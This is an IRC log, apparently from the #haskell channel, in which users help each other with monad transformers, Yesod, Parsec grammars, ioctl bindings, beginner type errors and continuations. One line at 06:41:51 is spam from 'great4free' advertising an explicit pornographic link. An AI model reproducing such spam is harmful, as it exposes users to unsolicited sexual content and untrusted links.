05:15:20 <mm_freak_> now you can add a function a -> Int
05:15:22 <mm_freak_> or a -> IO ()
05:15:28 <k-zed> ah yeah
05:15:33 <k-zed> ok, now i begin to understand
05:15:36 <mm_freak_> or even IO a
05:15:42 <sopvop> sooo, not everything can be made into transformer...
05:15:46 <mm_freak_> you have the type 'a' at hand and can write any other type based on it
05:16:09 <mm_freak_> sopvop: no, only types of kind (* -> *) -> * -> * can be monad transformers
05:16:17 <mm_freak_> just like only types of kind * -> * can be monads
05:17:05 <mm_freak_> MyMonadT a m b is valid, but MyMonadT m a b is invalid (as a monad transformer…  it can be a category or something else though)
05:17:11 <mm_freak_> (and assuming that m :: * -> *)
05:17:35 <k-zed> mm_freak_: thanks a lot - i'll go and play with these for a while
05:17:42 <mm_freak_> k-zed: have fun =)
05:18:22 <sopvop> So, how do I lift another monadic action into my monad without monadtrans instance?
05:18:37 <mm_freak_> you can write MonadTrans for MyMonadT a
05:19:20 <mm_freak_> sopvop: i'm just saying that your type arguments are in the wrong order =)
05:19:50 <quicksilver> you can have yet-anotehr-newtype with the parameters in the right ortder
05:19:56 <quicksilver> and you can push the lifting functions back and forth
05:20:00 <quicksilver> but... I wouldn't bother.
05:20:05 <quicksilver> I'd just fix your first newtype.
05:24:34 <burbul> My code is finally looking nice -- thank you all so much for all the help!
05:24:42 <quicksilver> you're welcome!
05:31:07 * hackagebot GTALib 0.0.4 - A library for GTA programming  http://hackage.haskell.org/package/GTALib-0.0.4 (KentoEmoto)
05:31:53 <Taneb> Grand Theft Auto programming!?
05:32:28 <t7> nope :(
05:32:37 <Taneb> :( indeed
05:32:52 <hpaste> sopvop pasted “stolen from validate package on hackage.” at http://hpaste.org/69140
05:32:55 <sopvop> Well, problem is what I don't fully understand how to fix another part of code then. See last instance.
05:36:59 <sopvop> kinds, kinds everywhere.
05:39:00 <dmwit> sopvop: The usual trick is to write something like
05:39:15 <hughfdjackson> is there any particular reasons there's snd and fst w/ tuples, instead of overloading !!?
05:39:20 <dmwit> "class Validate v where type Err v" or "class Validate v err | v -> err where"
05:39:43 <Eduard_Munteanu> hughfdjackson: overloading how?
05:39:51 <dmwit> Depending on whether you prefer TF or MPTC+FD.
05:39:54 <hughfdjackson> (1, 2) || 2
05:39:56 <hughfdjackson> resulting in 2
05:39:58 <hughfdjackson> oops
05:39:59 <hughfdjackson> *!!
05:40:12 <dmwit> Arguably MonadTrans should use a similar trick.
05:40:13 <Eduard_Munteanu> That won't work.
05:40:17 <hughfdjackson> oops :| i meant 1 also
05:40:22 <hughfdjackson> i know it won't
05:40:22 <sopvop> dmwit Oh, that should work
05:40:35 <hughfdjackson> :D i'm asking if there's a fundamental reason they chose not to go down that path
05:41:04 <Eduard_Munteanu> hughfdjackson: because it doesn't work :)
05:41:20 <Eduard_Munteanu> What would be the type of that operator?
05:41:54 <Eduard_Munteanu> :t fst
05:41:55 <lambdabot> forall a b. (a, b) -> a
05:41:58 <Eduard_Munteanu> :t snd
05:41:59 <lambdabot> forall a b. (a, b) -> b
05:42:39 <hughfdjackson> :t (!!)
05:42:40 <lambdabot> forall a. [a] -> Int -> a
05:42:51 <hughfdjackson> my thought was that !! would be defined by a typeclass
05:43:02 <hughfdjackson> then implemented by tuples and lists seperately
05:43:10 <hughfdjackson> am i wrong in thinking that's possible?
05:43:51 <Eduard_Munteanu> It isn't possible.
05:44:13 <Eduard_Munteanu> It'd need to handle different return types.
05:44:23 <MagneticDuck> a monoid is what you're looking for
05:44:26 <Eduard_Munteanu> Depending on an integer argument.
05:44:32 <MagneticDuck> but it doesn't work on tuples of tuples
05:44:48 <hughfdjackson> Eduard_Munteanu: :D thanks for talking me through that
05:45:03 <MagneticDuck> because ((a, b), c) /= (a, (b, c))
05:45:30 <hughfdjackson> hopefully further reading will make it make more sense n.n
05:45:37 <Eduard_Munteanu> hughfdjackson: there's HList (heterogenous lists) if you're interested, but a complicated mess and probably not something one should use
05:45:43 <MagneticDuck> heh
05:45:50 <hughfdjackson> haha
05:45:56 <hughfdjackson> i'll avoid it for a little while, then :D
05:46:39 <Eduard_Munteanu> Or you can define projections like that using Template Haskell, that should be possible, but you don't really get universal functions.
05:46:56 <hughfdjackson> is template haskell a language extension?
05:47:13 * MagneticDuck is away: Back at 4:30 my time.
05:47:16 <hughfdjackson> that term seems vaguely familiar..
05:47:21 <Eduard_Munteanu> Yeah.
05:47:36 <hughfdjackson> :D brill
05:47:36 <hughfdjackson> hehe
05:47:54 <hughfdjackson> needless to say, i don't need to do this, just wanted to understand if/why it was fundamentally impossible
05:50:34 <mm_freak_> hughfdjackson: one way to generalize fst/snd is on the value level…  they are fields, and fields are special cases of lenses
05:51:14 <hughfdjackson> lenses?
05:51:18 <hughfdjackson> actually
05:51:27 <hughfdjackson> let me google that, instead of asking you for a drip-feed ;)
05:54:03 * hughfdjackson puts that on the 'look at later' list ;)
05:54:33 <mm_freak_> a lens is just a first class generalized field access/update function =)
05:56:23 <haskellbeginner> hello
05:56:46 <haskellbeginner> connect
05:56:52 <hughfdjackson> haskellbeginner: you're connected
05:56:55 <hughfdjackson> don't worry :)
05:57:03 <haskellbeginner> :)
05:58:09 <schlicht> are there any best practice tips for working with gtk2hs or gui with haskell?
06:02:35 <hpc> schlicht: get comfortable with inversion of control
06:02:48 <hpc> and possibly learn the ContT trick that re-inverts control back to you
06:03:00 <hpc> (there's a good post about it on sigfpe's blog)
06:03:34 <schlicht> hpc, do you have the link at hand? :)
06:04:11 <hpc> http://blog.sigfpe.com/search?updated-min=2011-01-01T00:00:00-08:00&updated-max=2012-01-01T00:00:00-08:00&max-results=13
06:04:32 <schlicht> hpc, what does inversion mean within this context? do you have a small example so i understand you correctly?
06:04:35 <schlicht> thank you
06:06:03 <quicksilver> schlicht: inversion of control is just "doing stuff via callbacks"
06:06:20 <quicksilver> which feels very easy in haskell since it's so easy to pass smalla nonymous functions around
06:06:21 <schlicht> alright :)
06:06:28 <schlicht> yeah
06:06:51 <quicksilver> I mean, that's not *everything* inversion of control is, but it's a key example, and gtk2hs is all about callback IIRC.
06:07:31 <schlicht> i'm having trouble finding a nice way to accesse parts of the gui without passing every element i could need to every function
06:08:09 <quicksilver> yes.
06:08:25 <quicksilver> the simplest thing to do is have your entire "application state" in one big bundle
06:08:33 <quicksilver> probably in an IORef (possibly MVar)
06:08:42 <quicksilver> and just arrange for every callback to have access to it.
06:08:59 <quicksilver> there are quite a lot of ways to streamline that, hide the plumbing, and make it more modular
06:09:08 <quicksilver> but that's the starting point and it's easier than passing each separate bit around.
06:09:34 <schlicht> okay, thanks i will look into that :)
06:09:55 <schlicht> anymore keywords i should have a look at?
06:19:28 <Edoardo> Interesting...
06:22:59 <zezikaro> is anyone working on anything cool in haskell today?
06:24:00 <Edoardo> Why would I want to learn Haskell?
06:24:28 <zezikaro> Who's that aimed at?
06:24:46 <HugoDaniel> Edoardo: why not ?
06:24:48 <arcatan> Edoardo: for a great good!
06:24:52 <Edoardo> I really don't know; I think I like the syntax.
06:25:01 <HugoDaniel> learning a new thing is always great
06:25:20 <zezikaro> I think it's really cool, but I can't seem to find a use for it >.<U
06:25:41 <Edoardo> I came from C++ and PHP.
06:27:08 <luite> zezikaro: why not, just use it for everything (except the things where someone else decided that you must use another language)
06:27:30 <zezikaro> luite I can't use haskell i nthe browser can i
06:27:42 <luite> zezikaro: actually i'm working on a haskell to javascript compiler right now
06:28:15 <zezikaro> lucian lawlwat
06:28:15 <schlicht> luite, cool, for fun or why?
06:28:16 <zezikaro> link?
06:28:24 <mm_freak_> Edoardo: it may be good or bad to learn haskell…  to be fair let me tell you that haskell will ruin you for PHP
06:28:30 <luite> zezikaro: https://github.com/ghcjs/ghcjs
06:28:53 <Edoardo> mm_freak_ Why?
06:29:01 <zezikaro> I can't work git
06:29:01 <zezikaro> sadly
06:29:09 <luite> zezikaro: but there are also a few solutions that allow you to control the browser from haskell without trying to get all of haskell run client side
06:29:15 <zezikaro> Have you an example online? or is there a way to run these git files in the browser >.<U
06:29:56 <mm_freak_> Edoardo: well, if you had an evolutionary ladder of programming languages, PHP would be near the ground and to it haskell would appear like a little star in the sky
06:30:33 <mm_freak_> in other words:  knowing haskell will make you hate PHP =)
06:30:36 <luite> zezikaro: no example yet, and installing ghcjs is still a fairly involved process, should both be fixed soon (hopefully :p )
06:30:50 <ski> Edoardo : do you have any Haskell book or tutorial to follow, yet ?
06:31:02 <HugoDaniel> hate is a strong word, but would definetely make you feel that php is dead
06:31:12 <luite> zezikaro: but if you want to use haskell for making websites, you can check out yesod, happstack or snap
06:31:48 <zezikaro> HugoDaniel What projects have yo udone in haskell?
06:31:51 <Edoardo> ski: No :)
06:31:59 <luite> none of those have a really strong client side haskell solution though, so you usually have to generate html pages with some javascript
06:32:01 <zezikaro> I like the sytnax and what you can do, but i'm finding int hard to see a practical use for it
06:32:11 <mm_freak_> Edoardo: http://lukeplant.me.uk/blog/posts/why-learning-haskell-python-makes-you-a-worse-programmer/
06:32:12 <Sagi> I got the yesod book on friday, it's a nice read
06:32:41 <mm_freak_> Edoardo: note, that article is intended to be humorous…  not everybody gets that, and a few people close the pager after reading the headline =)
06:33:00 <Edoardo> For example, in Php I can open Notepad, write some line of code and save it into the server. It's very easy to use.
06:33:04 <Sagi> I don't have the immediate intention on writing web apps in haskell, but I was interested in how it compares with e.g. Django
06:33:04 <ski> @where LYAH
06:33:05 <lambdabot> http://www.learnyouahaskell.com/
06:33:11 <ski> Edoardo : you might like that ^ one
06:33:53 <kobsu> Edoardo: yes you can, but do you really do that?
06:34:20 <ski> you can write Haskell in Notepad as well
06:34:52 <Edoardo> kobsu: no no...
06:35:58 <mm_freak_> Sagi: in a recent discussion i had with a friend it turned out that yesod and django are pretty much on par in terms of features and convenience, but of course yesod is statically typed, so you get a lot of extra safety
06:36:56 <Edoardo> So, saying that PHP is not very good, why not Python?
06:37:40 <mm_freak_> Edoardo: while python is much better designed it suffers from the same conceptual weaknesses
06:37:54 <arbn> mm_freak_: Django has some convenient shortcuts that Yesod doesn't have. But, having used both, Yesod definitely saved me time. Debuggin time with Yesod is _so_ much less.
06:37:59 <mm_freak_> imperative programming, dynamic typing, etc.
06:38:21 <mm_freak_> arbn: could you name an example?
06:39:33 <Sagi> mm_freak_: the book doesn't detail on generating forms from models (persistent) although it hints that it is possible. Haven't looked into that, but that'll be the first thing I'll do when diving in :-)
06:39:40 <Edoardo> being a programmer that need speed, should I really consider Haskell?
06:39:50 <womb_> !
06:40:09 <arbn> mm_freak_: Well, like commonly-used views and tags that come pre-baked in Django's modules.
06:40:18 <mm_freak_> Sagi: yesod doesn't generate the forms for you…  you still have to give the order of the form elements and the action to run on submit =)
06:40:19 <Sagi> for me, that's an absolute requirement, I don't want to specify constraints of some type separately for each boundry.
06:40:47 <mm_freak_> Edoardo: haskell will speed up your web apps by orders of magnitude =)
06:40:52 <mm_freak_> compared to PHP that is
06:40:54 <Sagi> mm_freak_: I didn't mean to imply that it should all my work ;-)
06:40:58 <Sagi> +do
06:40:58 <arbn> And, yeah, Django's ability to generate forms from models is a nice shortcut.
06:41:25 <mm_freak_> Sagi: actually, it should…  it would be great if yesod could do that, but it doesn't at this point
06:41:29 <womb_> well in haskell you have to build your own things if you want to have like request forgery protection
06:41:43 <womb_> because there is not many ready implemnetations and mature frameworks :)
06:41:44 <mm_freak_> on the other head forms are really easy in yesod
06:41:51 <great4free> http://www.reddit.com/r/nsfwhot/comments/u7tbd/german_blondebig_boobs_girl_likes_quickie_sex_on/   GERMAN GIRLS GONE WILD  AND FUCKED IN TRAIN BY TRAVELER  HOT AMATEUR PORN MOVIE
06:41:51 <lucian> i should note that some of us python developers dislike django, and alternatives are about as capable as yesod anyway
06:41:51 <mm_freak_> womb_: have you tried yesod?
06:41:56 <womb_> but it is great to deliver API's like json apis i use it like this
06:42:07 <Sagi> womb_: I thought that existed already, at least the book seems to imply it does.
06:42:20 <womb_> i tried yesod and yes it doesn't have a lot of stuff and makes you learn a lot of their dsl's;/
06:42:28 <mm_freak_> womb_: yesod's form processing is very mature taking care of all the usual stuff like CSRF, etc.
06:42:30 <Sagi> (note: I haven't written a single line of code, just read the book over the weekend)
06:43:09 <Sagi> mm_freak_: I don't think any web framework will ever be able to determine the order of your form elements :-)
06:43:20 <Sagi> s/the order/your preferred order/
06:43:25 <womb_> well form processing cool but what about asset packeging or using something like data migrations on the db end :)
06:43:41 <Sagi> what is asset packaging?
06:43:46 <womb_> well i don't have a lot of exp with yesod i only did few sampels so you might be right
06:43:56 <mm_freak_> Sagi: they approximate the programmer's wish by using the order given in the data model…  most programmers write their data models in the order the fields will appear in the corresponding form (which is quite stupid actually)
06:44:12 <Sagi> yeah
06:44:27 <womb_> eg you have 500 .js files and 500 css files you want to compile and minimize them in production env but still have them as seperate files in dev + they should be build for each resource in a specific way
06:44:30 <mm_freak_> you might find it good that yesod doesn't do that
06:44:35 <lucian> womb_: there's nothing wrong with yesod not providing such things on its own
06:45:03 <womb_> yes and no.
06:45:07 <lucian> even django (which is otherwise quite monolithic) has migrations and asset packaging as separate libraries
06:45:34 <womb_> well but it has them as "addons" while here you have to develop it on your own.
06:45:37 <mm_freak_> womb_: in yesod these things are usually compiled from hamlet/lucius/julius files
06:45:39 <lucian> so yesod + various libs is about like Flask + SQLAlchemy + WTForms+ etc.
06:45:41 <mm_freak_> (or cassius if you prefer)
06:45:55 <womb_> what i wanted to say is = my time is used better when i add features and not reinvent the wheel :)
06:45:59 <mm_freak_> womb_: in other words it's up to you how you deliver your javascript
06:46:09 <mm_freak_> on the dev side you always have separate files
06:46:42 <mm_freak_> you can deliver them minified and even use sharing or memoization to do the minifying only once
06:46:44 <womb_> yes, but still its nice if you get everything out of box
06:46:47 <mm_freak_> etc.
06:46:58 <mm_freak_> you do that if you use the scaffolded site
06:47:51 <womb_> from time ti time i would like to build website :) not build new db from scratch because i can :D
06:47:56 <womb_> just humble opinion
06:48:06 <womb_> i know i can use uglifier to do it :)
06:48:17 <mm_freak_> in the scaffolded site there is quite a smart setup…  those files are combined, minified and hashed…  technically you refer to them by their hash value and they never expire…  meaning:  maximum caching, minimum requests, minimum traffic…  out of the box =)
06:48:40 <womb_> ok i need to go :P brb
06:48:46 <mm_freak_> hehe
06:49:44 <mm_freak_> yesod is great stuff for productive web development…  michael and the others have done some nice work to take care of almost everything that might disturb writing the actual application
06:49:54 <Sagi> mm_freak_: do you know if it is currently possible to get a form for some persistent data which uses its field constraints for form validation?
06:50:26 <Sagi> say the equivalent of ModelForms in Django
06:50:48 <mm_freak_> Sagi: you have to write the form yourself anyway, so you can do whatever you want…  in general i tend to use a separate type for the form instead of the model type
06:51:04 <Sagi> why would you want to write the form anyway?
06:51:23 <hpaste> utkarsh pasted “ll(k) parsing” at http://hpaste.org/69141
06:51:31 <mm_freak_> yesod doesn't generate forms from models
06:51:46 <namoamitabuddha> What about literate programming in haskell?
06:51:48 <mm_freak_> no idea whether this is planned, but in any case it doesn't do that currently
06:51:59 <Sagi> thanks for the answer :-)
06:52:01 <mm_freak_> namoamitabuddha: context?
06:52:21 <luite> greg weber had some plans to do more integration between models and forms, with validation, but i think he's busy with other projects at the moment
06:53:00 <utkarsh_> hi
06:53:01 <namoamitabuddha> mm_freak_: I have not found the same <foo>+= ... as in noweb.
06:53:45 <utkarsh_> is it possible to write code for the following grammer http://hpaste.org/69141 using normal parsec libraries?
06:54:07 <utkarsh_> I want to write a recursive decent parser for it
06:54:56 <mm_freak_> i don't see why not, although this grammar has a few performance traps
07:09:36 <utkarsh_> mm_freak : I am really new to using parsec, if you are free plz work out some short code
07:09:38 <utkarsh_> for it
07:10:04 <utkarsh_> I am having difficulty on dealing with epsilon
07:14:56 <arnsholt> I have a bunch of floats serialized form C with the %a formatter (the 0x1.deadbeefp+3 style). Is there a relatively straightforward way to deserialize them into Haskell from a String?
07:17:29 <hpc> arnsholt: so basically, hex scientific notation?
07:17:49 <hpc> the simple way is just to do it in parsec yourself
07:17:59 <hpc> it only takes a bit of division
07:21:08 <arnsholt> hpc: Base two not base ten, but pretty much yeah
07:22:05 <arnsholt> But yeah, it's prefectly doable. It'd just be silly to implement it on my own if there's a way already
07:23:04 <hpc> (i thought it was base-16)
07:23:27 <hpc> > read "0x1.deadbeefp+3" :: Double
07:23:28 <lambdabot>   *Exception: Prelude.read: no parse
07:23:30 <hpc> :(
07:23:39 <hpc> @hoogle scanf
07:23:40 <lambdabot> No results found
07:24:00 <luite> you can use encodeFloat once you have the significand and exponent
07:24:12 <arnsholt> The mantissa is printed out in base 16, yeah. But the exponent is the power of two used in the float
07:25:37 <arnsholt> luite: Cheers!
07:25:48 <arnsholt> Exactly the kind of function I was hoping for
07:27:35 <hpc> luite: cool, didn't know that existed
07:30:26 <sipa> :t encodeFloat
07:30:27 <lambdabot> forall a. (RealFloat a) => Integer -> Int -> a
07:39:11 <mroman> Has anybody here experience with haskell ioctl?
07:39:52 <ClaudiusMaximus> mroman: i did v4l2 library using it about a year ago, but haven't really touched it since so i've probably forgotten how it works
07:41:47 <mroman> ClaudiusMaximus: Ok.
07:42:00 <mroman> What is "IOControl req d" supposed to mean?
07:42:54 <ClaudiusMaximus> mroman: i think 'req' is a type that tags the ioctl number, and 'd' is the data struct used by the ioctl syscall
07:43:30 <ClaudiusMaximus> mroman: but my memory is hazy and i'm still not sure if i used it correctly, but it seemed to work
07:43:33 <mroman> But there are no constants defined like FIONREAD?
07:44:14 <mroman> like ioctl(fd, SOME_IOCTL, 0) in C
07:45:25 <ClaudiusMaximus> there's a class method that gives the ioctl number (the SOME_IOCTL value)
07:46:06 <mroman> I only see ioctlReq
07:46:11 <mroman> which converts a request to CInt
07:46:19 <dmwit> There are no instances of the class, though.
07:46:19 <ClaudiusMaximus> http://hackage.haskell.org/packages/archive/ioctl/0.0.1/doc/html/src/System-Posix-IOCtl.html#ioctl might make it clearer
07:46:43 <ClaudiusMaximus> dmwit: right, you need to make instances for the particular ioctls you want to use - there are 1000s of them...
07:46:53 <ClaudiusMaximus> ...all with different data structs
07:46:54 <dmwit> That's really annoying.
07:47:13 <dmwit> What's in that package is hardly worth calling an interface to ioctl at all.
07:47:48 <cognominal_> hi, is there a haskell grammar written in Parsec?
07:48:11 <dmwit> http://hackage.haskell.org/packages/archive/parsec/3.1.2/doc/html/Text-ParserCombinators-Parsec-Language.html
07:48:30 <utkarsh_> hi trying to make parser for the grammer S -> aSbS | epsilon  http://hpaste.org/69145 .
07:48:32 <dmwit> No idea how complete that is, but it almost certainly doesn't handle any GHC extensions, and is probably for H98, not H2010.
07:49:00 <cognominal_> tx, dmwit
07:49:03 <utkarsh_> although it cannot parse "abb" for obvious reason in the code. Plz correct it
07:49:16 <mroman> Oh.
07:49:21 <mroman> Ic @no instances
07:49:43 <dmwit> utkarsh_: "abb" is not in that grammar.
07:49:53 <mroman> Are there example instances somewhere?
07:50:00 <dmwit> "abb" is not a string in the language described by that grammar, I mean.
07:50:04 <mroman> I don't really know how to make haskell work with c stufg.
07:50:25 <utkarsh_> sorry it should be "aab" sorry once again , but u know there is something wrong in it
07:50:37 <dmwit> "aab" is not in the language, either.
07:51:14 <ClaudiusMaximus> mroman: http://holumbus.fh-wedel.de/hayoo/hayoo.html?query=IOCtl might have some more examples
07:51:45 <ClaudiusMaximus> in particulare the bindings-foo packages on page 2
07:52:02 <dmwit> utkarsh_: Why don't you say exactly what you tried, exactly what you expected to happen, and exactly what happened instead.
07:52:32 <cognominal_> dmwit: I see a lexer, but not the parser. Probably not looking in the right place.
07:53:12 <dmwit> cognominal_: No, I think you're right.
07:53:23 <dmwit> cognominal_: How strict is your "in parsec" requirement?
07:55:07 <mparodi> @hoogle [a] -> [a] -> [a]
07:55:09 <mroman> ClaudiusMaximus: Thanks.
07:55:10 <lambdabot> Prelude (++) :: [a] -> [a] -> [a]
07:55:10 <lambdabot> Data.List (++) :: [a] -> [a] -> [a]
07:55:10 <lambdabot> Data.List deleteFirstsBy :: (a -> a -> Bool) -> [a] -> [a] -> [a]
07:55:19 <mparodi> @hoogle+
07:55:19 <lambdabot> Data.List intersectBy :: (a -> a -> Bool) -> [a] -> [a] -> [a]
07:55:19 <lambdabot> Data.List unionBy :: (a -> a -> Bool) -> [a] -> [a] -> [a]
07:55:20 <lambdabot> Data.List (\\) :: Eq a => [a] -> [a] -> [a]
07:55:30 <cognominal_> dmwit: I want to translate Parsec grammars into Perl6 grammar. Parsec grammars being haskell code, I thougt it would be nice to have it parsed using Parse.
07:56:07 <mparodi> @src (\\)
07:56:08 <lambdabot> (\\) = foldl (flip delete)
07:56:37 * hackagebot hoauth 0.3.4 - A Haskell implementation of OAuth 1.0a protocol.  http://hackage.haskell.org/package/hoauth-0.3.4 (DiegoSouza)
07:56:49 <cognominal_> dmwit: Anyway I want to get a parse tree from a Parsec grammar, from that I can get a Perl6 grammar
07:57:36 <mparodi> I don't have \\ u.u
07:57:39 <mparodi> neither delete
07:57:46 <cognominal_> dmwit: where is the spec for the haskell grammar?
07:57:55 <dmwit> ?where report
07:57:56 <lambdabot> http://www.haskell.org/onlinereport/haskell2010/ (more: http://www.haskell.org/haskellwiki/Definition)
07:58:29 <dmwit> mparodi: Did you import Data.List, as hoogle is telling you to?
07:58:55 <mparodi> oh, good point. so Data.List is the module of \\?
07:59:14 <dmwit> I'm not sure, but (\\) is certainly in Data.List.
07:59:15 <mparodi> done, I have it now :)
08:01:09 <mparodi> wow, hoggle is great to find functions even if you only know its type :)
08:03:23 <dmwit> cognominal_: (See also http://hackage.haskell.org/packages/archive/haskell-src-exts/1.13.3/doc/html/Language-Haskell-Exts-Parser.html, which is why I asked about the Parsec restriction.)
08:06:35 <cognominal_> dmwit: sounds like it
08:16:35 <zezikaro> Hi could anyone help me please
08:16:35 <zezikaro> http://ideone.com/fdR2j
08:16:40 <zezikaro> "invaid type signautre"
08:16:44 <zezikaro> Nudge :: Shape -> Point -> Shape
08:16:45 <zezikaro> o.O
08:17:02 <zezikaro> I'm trying to modify what i'm reading on page 112 on learn you a haskell
08:17:12 <zezikaro> its original type was Shape -> Float -> Float -> Shape
08:17:49 <Taneb> Capital N
08:17:54 <Taneb> Change it to "nudge"
08:18:14 <mzero> types are upper case, values and functions are lower case
08:18:22 <mzero> in the initial character, that is
08:18:40 <Siod> anyone that's used contiuations: what's an example of something practical you've used them for?
08:19:02 <mzero> continuations in general? or the Cont monad?
08:19:02 <zezikaro> okay thank you
08:19:06 <zezikaro> http://ideone.com/xmNjk that happens now xD
08:19:16 <zezikaro> Couldn't match expected type `t -> Point'
08:19:24 <Siod> mzero: either, i guess
08:19:40 <mzero> zezikaro: you don't put parenthesis around arguments in Haskell
08:20:22 <mzero> just    nudge (Circle (Point 10 20) 10) (Point 10 10)
08:20:26 <Siod> mzero: what about if you're updating a record, e.g., myrecord { myfield = (myfield myrecord)}
08:20:36 <zezikaro> = Circle (Point (x1 + nudgeX) (y1 + nudgeY)) r
08:20:44 <Taneb> They're not arguments, Siod
08:20:58 <zezikaro> these paranthesis are hard in haskell
08:20:58 <Siod> Taneb: i don't follow
08:21:07 <Siod> Taneb: oh, nevermind
08:21:14 <mzero> uhm, let's break this down: nudge takes two argument, a shape and a point
08:21:43 <mzero> the shape must be built up --- so it is a sub-expression, hence in parens:      (Circle (Point 10 20) 10)
08:21:46 <mzero> that's a shape
08:21:58 <mzero> then the point is also built up   (Point 10 10)
08:22:44 <zezikaro> Is there a way to overload the operators for points/
08:22:45 <zezikaro> + :: Point -> Point
08:22:45 <zezikaro> + (Point x1 y1) (Point x2 y2) = Point (x1+x2) (y1+y2)	
08:23:02 <mzero> zezikaro: you can make Point an instance of typeclass Num
08:23:26 <mzero> @info Num
08:23:27 <lambdabot> Num
08:24:23 <mzero> but the usual way to proceed here would be to first write functions like    pointAdd, pointMultiply, etc...
08:24:55 <mzero> the problem with making Point a Num is that you need to implment   + * - abs signum and fromInteger
08:25:18 <zezikaro> is 'data' a class?
08:25:20 <mzero> but it don't think you have a meaningful  abs   or    *    for Point
08:25:29 <mzero> no
08:25:52 <jmcarthur> i usually just define Num componentwise and use something like vector-space for linear algebra type stuff
08:25:54 <mzero> that defines a new data type - a type that has values at runtime
08:25:54 <burbul> data is a keyword used to create new types
08:26:25 <burbul> It's like 'struct'  or ' record' in some imperative languages, if that helps
08:26:39 <mzero> if you find you are writing point addition alot, define a function called    (.+.)  then you can use your new operator on points
08:26:45 <mzero> p1 .+. p2
08:27:11 <mzero> for even more fun, you can write
08:27:18 <mzero> infixl 6 .+.
08:27:19 * jmcarthur thinks it's fine to use Num in this case
08:27:24 <mzero> and it will be left associative
08:27:52 <dmwit> ?hackage vector-space
08:27:52 <lambdabot> http://hackage.haskell.org/package/vector-space
08:28:07 <dmwit> That package has answers to some tricky questions you probably haven't even asked yourself yet.
08:28:11 <Siod> can someone give me an example of solving a real problem with continuations?
08:28:28 <Siod> i don't need code, i just want the intuition of what you'd use it for
08:28:35 <mzero> as you are learning from LYAH, I don't think you should bother with those references to vector-space package quite yet
08:28:55 <jmcarthur> Siod: continuations are rarely *needed*
08:29:17 <Siod> jmcarthur: i never said need
08:29:17 <dmwit> Siod: https://github.com/dmwit/pi-eta-epsilon/blob/master/src/Language/PiEtaEpsilon/Pretty/Debug.hs#L82 the 'k' is a continuation
08:29:37 <mzero> Siod - in the middle of a handler for a menu item, I store away a closure for undoing the operation
08:29:48 <dmwit> https://github.com/dmwit/pi-eta-epsilon/blob/master/src/Language/PiEtaEpsilon/Evaluator.hs#L25 the Context data type is defined here
08:30:00 <jmcarthur> Siod: any use of callCC might be interesting (just google it)
08:30:18 <dmwit> mzero: (closures and continuations aren't exactly the same)
08:30:45 <dmwit> ...maybe I take that back.
08:30:49 <jmcarthur> i think it's fuzzy
08:30:55 <dmwit> yeah
08:31:04 <jmcarthur> "continuation" is just about how the closure is inteded to be used
08:31:11 <jmcarthur> *intended
08:31:19 <dmwit> right =)
08:31:44 <mzero> dmwit: I think Soid's asking a general question here... but not sure
08:31:55 <Siod> yes
08:32:22 <parcs`> do Foreign.Concurrent finalizers run in a separate haskell thread or os thread? http://hackage.haskell.org/packages/archive/base/4.5.0.0/doc/html/Foreign-Concurrent.html
08:32:25 <jmcarthur> Siod: pretty much all monadic code is written in a continuation passing style
08:33:11 <jmcarthur> Siod: that is, bind just takes some value and a continuation
08:33:15 <Siod> so, continuations are practically a generalization of more specific monads?
08:33:34 <Siod> and so they allow more leeway in what you want to do?
08:33:35 <jmcarthur> i don't know that that's a helpful way of looking at it
08:34:05 <Siod> is it correct?
08:34:08 <jmcarthur> continuations are actually so general as to be boring
08:34:41 <Siod> can i reimplement other monads using continuations?
08:34:54 <jmcarthur> you can implement basically anything using continuations
08:35:17 <Siod> i.e., i can't reimplement the state monad using the reader monad, but i could do both with a continuation?
08:35:49 <jmcarthur> i would like to steer you away from this direction of thinking of continuations as in some way related to monads
08:36:19 <burbul> you did say pretty much all monadic code is written in a continuation passing style!
08:36:21 <Siod> they seem to be a way of generalizing threading of execution
08:36:27 <Siod> or control flow
08:36:28 <jmcarthur> you can use continuations to describe things that are monads and things that are not monads
08:36:32 <burbul> ah
08:36:33 <Siod> and that falls under monads
08:36:45 <jmcarthur> burbul: yes, but i didn't intend to say that continuations are tied to monads in any way
08:36:46 <mzero> Siod: if you are asking about situation where continuations have been traditionally employed, it has been to create novel control structures - if the language provides a continuation construct, then you build all sorts of control structures yourself
08:37:08 <jmcarthur> Siod: monads aren't the only way to talk about "control flow"
08:37:13 <mzero> that said, most langauage provide a healthy set of control structures, including the kinds buildable with a continuation primtivie directly ---
08:37:21 <Siod> jmcarthur: how did you imply that from what i said?
08:37:58 <jmcarthur> Siod: you seem to have latched onto this idea of continuations being a generalization of monads
08:38:22 <Siod> jmcarthur: "they seem to be a way of generalizing threading of
08:38:22 <Siod>              execution" more specifically
08:38:34 <Siod> "or control flow"
08:38:44 <Siod> is that accurate?
08:38:47 <jmcarthur> Siod: lazy evaluation is also that, and along with it most haskell data types
08:38:56 <matthiasgorgens> one way of generalizing.
08:39:25 <Siod> but aren't continuations more general than lazy evaluation?
08:39:27 <jmcarthur> Siod: in fact, "threading of execution" is not a very interesting thing to think about in haskell
08:39:55 <jmcarthur> Siod: from some points of view they are each more general than the other. from other points of view they are unrelated
08:40:12 <dmwit> Continuations are not a generalization of lazy evaluation. Lazy evaluation is not a generalization of continuations.
08:40:31 <Siod> but couldn't you implement lazy evaluation inside a continuation?
08:40:46 <jmcarthur> Siod: sure, but you could also implement continuations with lazy evaluation
08:41:01 <jmcarthur> (err... some form of, depending on the language)
08:41:05 <dmwit> Continuations may contain arbitrary code, including perhaps an implementation of Perl or your favorite lazily evaluated language or...
08:41:06 <matthiasgorgens> what do you mean by implement?
08:41:14 <matthiasgorgens> yeah.
08:41:48 <matthiasgorgens> than there's also the other form of `implement' that stays in the language.  I.e. "the continuation monad can simulate all other monads in haskell."
08:41:59 <absence> i notice that executables produced by ghc are quite large. i'm not complaining, but am genuinely curious about what all that stuff is. i have a quite simple piece of code using gpipe and netwire to render a cube that can be rotated with the arrow keys, and the stripped executable is 8.5 MB
08:42:03 <Siod> what would a OO class hierachy of continuations look like?
08:42:13 <Siod> i.e., what's the base class, and what derived from continuations?
08:42:24 <jmcarthur> this is what's wrong
08:42:28 <jmcarthur> it's not like that
08:42:32 <dmwit> The question is not meaningful.
08:42:53 <matthiasgorgens> Siod: that doesn't make much sense..
08:42:53 <Siod> it'd be more meaningful if you told me why
08:42:58 <dmwit> absence: By default, GHC executables are statically linked to any Haskell library they use.
08:43:13 <Eduard_Munteanu> Best case you get something like Cont being an implementation for a Monad interface, IIRC the OO lingo.
08:43:17 <matthiasgorgens> Siod: oo class hierarchy's are the wrong tool to think about continuations.
